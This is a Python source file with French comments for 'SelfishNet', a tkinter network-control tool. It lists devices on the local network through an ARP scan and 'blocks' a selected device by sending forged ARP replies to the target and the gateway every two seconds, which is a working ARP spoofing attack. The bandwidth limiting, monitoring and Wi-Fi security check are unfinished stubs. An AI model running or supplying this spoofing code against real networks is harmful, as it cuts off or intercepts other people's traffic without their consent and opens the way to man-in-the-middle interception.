# Structure principale de SelfishNet

from kamene.all import ARP, Ether, srp, send
import time
import threading
import tkinter as tk
from tkinter import ttk
import netifaces
import psutil
import socket
import struct
import uuid

class SelfishNet:
    def __init__(self):
        self.network_devices = []
        self.interface = self.get_default_interface()
        self.gateway_ip = self.get_gateway_ip()
        self.local_ip = self.get_local_ip()
        self.local_mac = self.get_local_mac()
        self.blocked_devices = []
        self.throttled_devices = {}  # {mac_address: speed_limit_kbps}
        self.scan_thread = None
        self.arp_spoof_threads = {}
        self.monitoring = False

    def get_default_interface(self):
        """Récupère l'interface réseau par défaut"""
        gateways = netifaces.gateways()
        if 'default' in gateways and netifaces.AF_INET in gateways['default']:
            return gateways['default'][netifaces.AF_INET][1]
        return None

    def get_gateway_ip(self):
        """Récupère l'adresse IP de la passerelle par défaut"""
        gateways = netifaces.gateways()
        if 'default' in gateways and netifaces.AF_INET in gateways['default']:
            return gateways['default'][netifaces.AF_INET][0]
        return None

    def get_local_ip(self):
        """Récupère l'adresse IP locale de la machine"""
        if self.interface:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
        return None

    def get_local_mac(self):
        """Récupère l'adresse MAC locale de la machine"""
        if self.interface:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_LINK in addrs:
                return addrs[netifaces.AF_LINK][0]['addr']
        return None

    def get_network_prefix(self):
        """Récupère le préfixe réseau (ex: 192.168.1)"""
        if self.local_ip:
            return '.'.join(self.local_ip.split('.')[:3])
        return None

    def scan_network(self):
        """Scanne le réseau pour détecter les appareils connectés"""
        network_prefix = self.get_network_prefix()
        if not network_prefix:
            return []

        target_ip = f"{network_prefix}.1/24"
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]
        devices = []

        for sent, received in result:
            # Essayer d'obtenir le nom d'hôte
            hostname = ''
            try:
                hostname = socket.gethostbyaddr(received.psrc)[0]
            except:
                hostname = 'Unknown'

            devices.append({
                'ip': received.psrc, 
                'mac': received.hwsrc,
                'hostname': hostname
            })

        self.network_devices = devices
        return devices

    def block_device(self, target_mac, target_ip):
        """Bloque un appareil en utilisant l'ARP spoofing"""
        if target_mac in self.blocked_devices:
            return False

        self.blocked_devices.append(target_mac)

        # Démarrer le thread d'ARP spoofing pour ce périphérique
        spoof_thread = threading.Thread(
            target=self._arp_spoof_device,
            args=(target_ip, target_mac),
            daemon=True
        )
        self.arp_spoof_threads[target_mac] = spoof_thread
        spoof_thread.start()
        return True

    def unblock_device(self, target_mac, target_ip):
        """Débloque un appareil en arrêtant l'ARP spoofing"""
        if target_mac not in self.blocked_devices:
            return False

        self.blocked_devices.remove(target_mac)

        # Restaurer l'ARP normal
        gateway_mac = self._get_mac(self.gateway_ip)
        if gateway_mac:
            # Restaurer la communication entre la cible et la passerelle
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                          psrc=self.gateway_ip, hwsrc=gateway_mac)
            packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                          psrc=target_ip, hwsrc=target_mac)
            send(packet1, verbose=0, count=5)
            send(packet2, verbose=0, count=5)

        return True

    def _arp_spoof_device(self, target_ip, target_mac):
        """Exécute l'ARP spoofing en continu contre un appareil cible"""
        gateway_mac = self._get_mac(self.gateway_ip)
        if not gateway_mac:
            return

        try:
            while target_mac in self.blocked_devices:
                # Dire à la cible que nous sommes la passerelle
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                             psrc=self.gateway_ip, hwsrc=self.local_mac)
                # Dire à la passerelle que nous sommes la cible
                packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                             psrc=target_ip, hwsrc=self.local_mac)

                send(packet1, verbose=0)
                send(packet2, verbose=0)
                time.sleep(2)  # Envoyer toutes les 2 secondes
        except Exception as e:
            print(f"Erreur lors de l'ARP spoofing: {e}")

    def _get_mac(self, ip):
        """Obtient l'adresse MAC d'une adresse IP donnée"""
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0)[0]

        if result:
            return result[0][1].hwsrc
        return None

    def throttle_device(self, target_mac, speed_limit_kbps):
        """Limite la bande passante d'un appareil"""
        self.throttled_devices[target_mac] = speed_limit_kbps
        # Implémentation réelle nécessite des hooks au niveau réseau comme NFQueue
        # Cette fonctionnalité nécessite un module supplémentaire

    def unthrottle_device(self, target_mac):
        """Supprime la limitation de bande passante d'un appareil"""
        if target_mac in self.throttled_devices:
            del self.throttled_devices[target_mac]

    def start_monitoring(self):
        """Démarre la surveillance du réseau en temps réel"""
        self.monitoring = True
        # Implémentation à ajouter avec psutil pour surveiller l'activité réseau

    def stop_monitoring(self):
        """Arrête la surveillance du réseau"""
        self.monitoring = False

    def check_network_security(self):
        """Vérifie la sécurité du réseau Wi-Fi"""
        # Cette fonctionnalité nécessite l'intégration avec des outils système
        # pour déterminer le type de chiffrement du réseau
        # Non implémenté dans cette version de base
        pass

# Classe pour l'interface graphique
class SelfishNetGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SelfishNet - Contrôleur de réseau")
        self.root.geometry("900x600")

        self.app = SelfishNet()
        self.setup_ui()

        # Scanner le réseau au démarrage
        self.scan_network()

    def setup_ui(self):
        """Configure l'interface utilisateur"""
        # Zone principale avec onglets
        self.tabControl = ttk.Notebook(self.root)

        # Onglet Appareils
        self.tab_devices = ttk.Frame(self.tabControl)
        self.tabControl.add(self.tab_devices, text='Appareils')

        # Onglet Surveillance
        self.tab_monitor = ttk.Frame(self.tabControl)
        self.tabControl.add(self.tab_monitor, text='Surveillance')

        # Onglet Sécurité
        self.tab_security = ttk.Frame(self.tabControl)
        self.tabControl.add(self.tab_security, text='Sécurité')

        self.tabControl.pack(expand=1, fill="both")

        # Configuration de l'onglet Appareils
        self.setup_devices_tab()

        # Configuration de l'onglet Surveillance
        self.setup_monitor_tab()

        # Configuration de l'onglet Sécurité
        self.setup_security_tab()

        # Barre d'état
        self.status_bar = tk.Label(self.root, text="Prêt", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def setup_devices_tab(self):
        """Configure l'onglet des appareils connectés"""
        # Frame supérieure avec boutons
        top_frame = tk.Frame(self.tab_devices)
        top_frame.pack(fill=tk.X, padx=5, pady=5)

        # Bouton Actualiser
        refresh_btn = tk.Button(top_frame, text="Actualiser", command=self.scan_network)
        refresh_btn.pack(side=tk.LEFT, padx=5)

        # TreeView pour la liste des appareils
        columns = ('IP', 'MAC', 'Nom', 'Statut')
        self.devices_tree = ttk.Treeview(self.tab_devices, columns=columns, show='headings')

        # Configurer les en-têtes
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, width=100)

        # Scrollbar
        scrollbar = ttk.Scrollbar(self.tab_devices, orient=tk.VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscroll=scrollbar.set)

        # Placement
        self.devices_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)

        # Menu contextuel pour les appareils
        self.device_menu = tk.Menu(self.root, tearoff=0)
        self.device_menu.add_command(label="Bloquer", command=self.block_selected_device)
        self.device_menu.add_command(label="Débloquer", command=self.unblock_selected_device)
        self.device_menu.add_separator()
        self.device_menu.add_command(label="Limiter la vitesse", command=self.throttle_selected_device)

        # Liaison avec le clic droit
        self.devices_tree.bind("<Button-3>", self.show_device_menu)

    def setup_monitor_tab(self):
        """Configure l'onglet de surveillance"""
        # Cette section peut être développée davantage avec des graphiques en temps réel
        monitor_frame = tk.Frame(self.tab_monitor)
        monitor_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Boutons de contrôle
        btn_frame = tk.Frame(monitor_frame)
        btn_frame.pack(fill=tk.X)

        start_btn = tk.Button(btn_frame, text="Démarrer la surveillance", 
                             command=self.start_monitoring)
        start_btn.pack(side=tk.LEFT, padx=5)

        stop_btn = tk.Button(btn_frame, text="Arrêter la surveillance", 
                             command=self.stop_monitoring)
        stop_btn.pack(side=tk.LEFT, padx=5)

        # Zone de log
        self.monitor_log = tk.Text(monitor_frame, height=20, width=80)
        self.monitor_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def setup_security_tab(self):
        """Configure l'onglet de sécurité réseau"""
        security_frame = tk.Frame(self.tab_security)
        security_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Bouton de vérification de sécurité
        check_btn = tk.Button(security_frame, text="Vérifier la sécurité du réseau", 
                             command=self.check_security)
        check_btn.pack(pady=10)

        # Zone d'information
        self.security_info = tk.Text(security_frame, height=20, width=80)
        self.security_info.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def scan_network(self):
        """Lance le scan du réseau et met à jour l'interface"""
        self.status_bar.config(text="Scan du réseau en cours...")

        # Vider la liste actuelle
        for item in self.devices_tree.get_children():
            self.devices_tree.delete(item)

        # Exécuter le scan dans un thread séparé pour ne pas bloquer l'interface
        def scan_thread():
            devices = self.app.scan_network()

            # Mettre à jour l'interface dans le thread principal
            self.root.after(0, lambda: self.update_devices_list(devices))

        thread = threading.Thread(target=scan_thread)
        thread.daemon = True
        thread.start()

    def update_devices_list(self, devices):
        """Met à jour la liste des appareils dans l'interface"""
        for device in devices:
            # Vérifier si l'appareil est bloqué
            status = "Bloqué" if device['mac'] in self.app.blocked_devices else "Actif"

            # Ajouter à la liste
            self.devices_tree.insert('', tk.END, values=(
                device['ip'],
                device['mac'],
                device['hostname'],
                status
            ))

        self.status_bar.config(text=f"Scan terminé: {len(devices)} appareils trouvés")

    def show_device_menu(self, event):
        """Affiche le menu contextuel pour un appareil"""
        # Identifier l'élément sous le curseur
        item = self.devices_tree.identify_row(event.y)
        if item:
            # Sélectionner l'élément
            self.devices_tree.selection_set(item)
            # Afficher le menu
            self.device_menu.post(event.x_root, event.y_root)

    def get_selected_device(self):
        """Récupère les informations de l'appareil sélectionné"""
        selected_items = self.devices_tree.selection()
        if not selected_items:
            return None

        item = selected_items[0]
        values = self.devices_tree.item(item, 'values')
        if not values or len(values) < 2:
            return None

        return {
            'ip': values[0],
            'mac': values[1],
            'hostname': values[2],
            'status': values[3]
        }

    def block_selected_device(self):
        """Bloque l'appareil sélectionné"""
        device = self.get_selected_device()
        if not device:
            return

        if self.app.block_device(device['mac'], device['ip']):
            self.status_bar.config(text=f"Appareil {device['hostname']} ({device['ip']}) bloqué")
            self.scan_network()  # Actualiser la liste

    def unblock_selected_device(self):
        """Débloque l'appareil sélectionné"""
        device = self.get_selected_device()
        if not device:
            return

        if self.app.unblock_device(device['mac'], device['ip']):
            self.status_bar.config(text=f"Appareil {device['hostname']} ({device['ip']}) débloqué")
            self.scan_network()  # Actualiser la liste

    def throttle_selected_device(self):
        """Ouvre une boîte de dialogue pour limiter la vitesse de l'appareil sélectionné"""
        device = self.get_selected_device()
        if not device:
            return

        # Créer une boîte de dialogue
        dialog = tk.Toplevel(self.root)
        dialog.title("Limiter la vitesse")
        dialog.geometry("300x150")
        dialog.transient(self.root)
        dialog.grab_set()

        tk.Label(dialog, text=f"Limiter la vitesse pour {device['hostname']}").pack(pady=10)

        frame = tk.Frame(dialog)
        frame.pack(fill=tk.X, padx=10)

        tk.Label(frame, text="Vitesse (kbps):").pack(side=tk.LEFT, pady=5)
        speed_var = tk.StringVar(value="1024")  # Valeur par défaut: 1 Mbps
        entry = tk.Entry(frame, textvariable=speed_var, width=10)
        entry.pack(side=tk.LEFT, padx=5, pady=5)

        def apply_limit():
            try:
                speed = int(speed_var.get())
                self.app.throttle_device(device['mac'], speed)
                self.status_bar.config(text=f"Vitesse limitée à {speed} kbps pour {device['hostname']}")
                dialog.destroy()
            except ValueError:
                tk.messagebox.showerror("Erreur", "Veuillez entrer une valeur numérique")

        tk.Button(dialog, text="Appliquer", command=apply_limit).pack(pady=10)

    def start_monitoring(self):
        """Démarre la surveillance du réseau"""
        self.app.start_monitoring()
        self.monitor_log.insert(tk.END, "Surveillance du réseau démarrée...\n")
        self.status_bar.config(text="Surveillance active")

    def stop_monitoring(self):
        """Arrête la surveillance du réseau"""
        self.app.stop_monitoring()
        self.monitor_log.insert(tk.END, "Surveillance du réseau arrêtée.\n")
        self.status_bar.config(text="Surveillance inactive")

    def check_security(self):
        """Vérifie la sécurité du réseau Wi-Fi"""
        self.security_info.delete(1.0, tk.END)
        self.security_info.insert(tk.END, "Analyse de la sécurité réseau...\n\n")

        # Information sur l'interface
        self.security_info.insert(tk.END, f"Interface réseau: {self.app.interface}\n")
        self.security_info.insert(tk.END, f"Adresse IP locale: {self.app.local_ip}\n")
        self.security_info.insert(tk.END, f"Adresse MAC locale: {self.app.local_mac}\n")
        self.security_info.insert(tk.END, f"Passerelle par défaut: {self.app.gateway_ip}\n\n")

        # Simulation d'une vérification de sécurité
        self.security_info.insert(tk.END, "Vérification du chiffrement Wi-Fi... [En développement]\n")
        self.security_info.insert(tk.END, "Analyse des vulnérabilités... [En développement]\n")

        self.status_bar.config(text="Vérification de sécurité terminée")

# Point d'entrée de l'application
def main():
    root = tk.Tk()
    app = SelfishNetGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()